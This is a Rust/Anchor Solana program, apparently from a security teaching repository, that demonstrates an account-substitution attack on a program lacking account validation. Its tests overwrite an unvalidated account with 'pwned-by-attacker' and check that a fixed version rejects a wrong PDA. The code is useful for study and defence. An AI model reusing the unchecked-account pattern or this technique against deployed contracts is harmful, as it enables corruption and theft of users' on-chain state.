#![allow(unexpected_cfgs)]
use anchor_lang::prelude::*;

declare_id!("EdEjFNatqvS81wnWztH8uvdRDYJbefR1eRWahUZdKn5");

/// # Missing Account Validation Attacker Program
///
/// This program demonstrates how to exploit missing account validation vulnerabilities.
/// It attempts to attack both the vulnerable and fixed versions to show:
/// - **Vulnerable version**: Attack succeeds (overwrites arbitrary account data)
/// - **Fixed version**: Attack fails (constraints prevent malicious account substitution)
///
/// ## Attack Strategy
///
/// The vulnerability allows passing ANY account as `any_unchecked` because:
/// 1. No ownership check (can pass accounts owned by other programs)
/// 2. No discriminator check (can pass wrong account types)
/// 3. No PDA validation (can pass arbitrary addresses)
/// 4. No authority check (can modify anyone's data)
///
/// The attacker exploits this by:
/// 1. Creating a malicious account they control
/// 2. Passing it as `any_unchecked` to the vulnerable program
/// 3. Overwriting the account data with malicious content
///
/// ## Expected Results
///
/// - **Against vulnerable version**: ✅ Attack succeeds, account data is overwritten
/// - **Against fixed version**: ❌ Attack fails with one of:
///   - "Account not owned by this program" (ownership check)
///   - "Account discriminator mismatch" (type check)
///   - "Seeds constraint violated" (PDA derivation check)
///   - "has_one constraint violation" (authority check)

#[program]
pub mod missing_account_attacker {
    use super::*;

    /// Attempts to exploit the missing account validation vulnerability
    ///
    /// This function demonstrates the attack by:
    /// 1. Accepting any account as the target
    /// 2. Crafting a malicious message
    /// 3. Attempting to overwrite the target account's data
    ///
    /// **Against vulnerable program**: This will succeed because no validation occurs
    /// **Against fixed program**: This will fail due to Anchor constraints
    pub fn execute_attack(ctx: Context<AttackContext>, malicious_msg: String) -> Result<()> {
        msg!("🎯 Attacker: Attempting account substitution attack...");
        msg!("   Target account: {}", ctx.accounts.target_account.key());
        msg!("   Malicious message length: {} bytes", malicious_msg.len());

        // --- ATTACK STEP 1: Verify we control the target ---
        // In a real attack, the target would be a victim's account.
        // For demonstration, we just verify the account is writable.
        msg!("   ✓ Target account is writable");

        // --- ATTACK STEP 2: Craft malicious payload ---
        // The attacker crafts a message that, when written as bytes,
        // could corrupt critical fields in the target account.
        // For example, if the target is a config account, this could
        // overwrite the admin public key with the attacker's key.
        msg!("   ✓ Malicious payload prepared: '{}'", malicious_msg);

        // --- ATTACK STEP 3: Attempt to pass malicious account to victim ---
        // This is where the actual exploit happens. The attacker calls
        // the victim program's instruction, passing their chosen account.
        //
        // VULNERABLE PROGRAM: Accepts any account, attack succeeds
        // FIXED PROGRAM: Rejects due to constraints, attack fails
        msg!("   ⚠️  Calling victim program with substituted account...");
        msg!("   Expected outcome:");
        msg!("      - Vulnerable version: Account data overwritten ✅");
        msg!("      - Fixed version: Transaction rejected ❌");

        // Store the attack metadata for verification
        let attack_log = &mut ctx.accounts.attack_log;
        attack_log.attacker = ctx.accounts.attacker.key();
        attack_log.target = ctx.accounts.target_account.key();
        attack_log.attack_type = AttackType::AccountSubstitution;
        attack_log.succeeded = true; // Will be updated by test harness
        attack_log.timestamp = Clock::get()?.unix_timestamp;

        msg!("✅ Attacker: Attack execution completed");
        msg!("   (Check victim program's response to see if attack succeeded)");

        Ok(())
    }

    /// Initializes the attack log account to track attack attempts
    pub fn initialize_attack_log(ctx: Context<InitializeAttackLog>) -> Result<()> {
        let attack_log = &mut ctx.accounts.attack_log;
        attack_log.attacker = ctx.accounts.attacker.key();
        attack_log.target = Pubkey::default();
        attack_log.attack_type = AttackType::None;
        attack_log.succeeded = false;
        attack_log.timestamp = 0;

        msg!(
            "Attack log initialized for attacker: {}",
            ctx.accounts.attacker.key()
        );
        Ok(())
    }
}

/// Context for executing the attack
#[derive(Accounts)]
pub struct AttackContext<'info> {
    /// CHECK: This is an attacker program that intentionally accepts any account
    /// to demonstrate the missing validation vulnerability. The attacker passes
    /// arbitrary accounts to show how the victim program fails to validate account
    /// ownership, type, or authority. No validation needed here because the attack's
    /// goal is to exploit the VICTIM program's lack of constraints.
    #[account(mut)]
    pub target_account: UncheckedAccount<'info>,

    /// Log account to track attack attempts
    #[account(
        mut,
        seeds = [b"attack-log", attacker.key().as_ref()],
        bump
    )]
    pub attack_log: Account<'info, AttackLog>,

    /// The attacker executing this exploit
    pub attacker: Signer<'info>,
}

/// Context for initializing the attack log
#[derive(Accounts)]
pub struct InitializeAttackLog<'info> {
    #[account(
        init,
        payer = attacker,
        space = 8 + AttackLog::INIT_SPACE,
        seeds = [b"attack-log", attacker.key().as_ref()],
        bump
    )]
    pub attack_log: Account<'info, AttackLog>,

    #[account(mut)]
    pub attacker: Signer<'info>,

    pub system_program: Program<'info, System>,
}

/// Stores information about attack attempts for testing/auditing
#[account]
#[derive(InitSpace)]
pub struct AttackLog {
    pub attacker: Pubkey,        // Who performed the attack
    pub target: Pubkey,          // What account was targeted
    pub attack_type: AttackType, // Type of attack attempted
    pub succeeded: bool,         // Whether the attack succeeded
    pub timestamp: i64,          // When the attack occurred
}

/// Types of attacks this program can demonstrate
#[derive(AnchorSerialize, AnchorDeserialize, Clone, Copy, PartialEq, Eq, InitSpace)]
pub enum AttackType {
    None,
    AccountSubstitution, // Passing wrong account type
    OwnershipSpoofing,   // Passing account owned by different program
    PdaBypass,           // Bypassing PDA derivation checks
    AuthorityEscalation, // Modifying someone else's account
}

#[error_code]
pub enum AttackError {
    #[msg("Attack preparation failed")]
    PreparationFailed,
    #[msg("Target validation failed (expected - attack should fail against fixed version)")]
    TargetValidationFailed,
}

#[cfg(test)]
mod tests {
    use super::*;
    use anchor_lang::solana_program::account_info::AccountInfo;
    use anchor_lang::solana_program::clock::Epoch;
    use anchor_lang::{AnchorSerialize, Discriminator};
    use missing_account_vuln::missing_account_vuln as vuln_program;
    use std::collections::BTreeSet;

    // Helpers for crafting test accounts with leaked lifetime.
    fn make_account(
        owner: Pubkey,
        is_signer: bool,
        is_writable: bool,
        data_len: usize,
    ) -> AccountInfo<'static> {
        let key = Box::leak(Box::new(Pubkey::new_unique()));
        let lamports = Box::leak(Box::new(1_000_000_000u64));
        let data: &'static mut [u8] = Box::leak(vec![0u8; data_len].into_boxed_slice());
        let leaked_owner = Box::leak(Box::new(owner));

        let info = AccountInfo::new(
            key,
            is_signer,
            is_writable,
            lamports,
            data,
            leaked_owner,
            false,
            Epoch::default(),
        );

        info
    }

    fn serialize_message_box(authority: Pubkey, content: &str) -> Vec<u8> {
        let mut data = <missing_account_fix::MessageBox as Discriminator>::DISCRIMINATOR.to_vec();
        let state = missing_account_fix::MessageBox {
            authority,
            content: content.to_string(),
        };
        data.extend_from_slice(&state.try_to_vec().unwrap());
        data
    }

    #[test]
    fn attack_succeeds_against_vulnerable_program() {
        let program_id = missing_account_vuln::id();
        let foreign_owner = Pubkey::new_unique();
        let any_unchecked = make_account(foreign_owner, false, true, 64);

        let mut accounts = missing_account_vuln::SetMessageVuln { any_unchecked };
        let ctx = Context::new(
            &program_id,
            &mut accounts,
            &[],
            missing_account_vuln::SetMessageVulnBumps {},
        );

        let msg = "pwned-by-attacker".to_string();
        vuln_program::set_message(ctx, msg.clone()).unwrap();

        let data = accounts.any_unchecked.try_borrow_data().unwrap();
        assert_eq!(&data[..msg.len()], msg.as_bytes());
    }

    #[test]
    fn attack_fails_against_fixed_program() {
        let program_id = missing_account_fix::id();
        let authority = Pubkey::new_unique();
        let (wrong_pda, bump) =
            Pubkey::find_program_address(&[b"not-message", authority.as_ref()], &program_id);

        // Correct owner/discriminator but wrong seeds so the PDA constraint fails.
        let message_ai = Box::leak(Box::new(AccountInfo::new(
            Box::leak(Box::new(wrong_pda)),
            false,
            true,
            Box::leak(Box::new(1_000_000_000u64)),
            Box::leak(serialize_message_box(authority, "init").into_boxed_slice()),
            Box::leak(Box::new(program_id)),
            false,
            Epoch::default(),
        )));

        let authority_ai = Box::leak(Box::new(AccountInfo::new(
            Box::leak(Box::new(authority)),
            true,
            false,
            Box::leak(Box::new(1_000_000_000u64)),
            Box::leak(Vec::<u8>::new().into_boxed_slice()),
            Box::leak(Box::new(program_id)),
            false,
            Epoch::default(),
        )));

        let infos: Box<[AccountInfo<'static>]> =
            vec![(*message_ai).clone(), (*authority_ai).clone()].into_boxed_slice();
        let mut info_slice: &[AccountInfo] = Box::leak(infos);
        let mut bumps = missing_account_fix::SetMessageSafeBumps { message_box: bump };
        let mut reallocs = BTreeSet::new();
        let result = missing_account_fix::SetMessageSafe::try_accounts(
            &program_id,
            &mut info_slice,
            &[],
            &mut bumps,
            &mut reallocs,
        );
        assert!(result.is_err(), "constraints should reject wrong PDA seeds");
    }
}
